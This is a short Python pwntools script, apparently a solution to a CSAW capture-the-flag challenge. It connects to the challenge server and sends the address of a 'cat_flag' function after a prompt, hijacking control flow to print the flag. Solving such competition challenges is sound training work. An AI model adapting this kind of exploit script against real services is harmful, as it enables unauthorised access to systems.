from pwn import *

# Set up the connection to the remote server
conn = remote('pwn.chal.csaw.io', 31138)

# The address of the cat_flag function
cat_flag_addr = '0x400717'

# Receive the prompt and send the address
conn.recvuntil(b'Aim carefully.... ')
conn.sendline(cat_flag_addr.encode())

# Get the flag
response = conn.recvall().decode('utf-8', errors='ignore')
print(response)

conn.close()
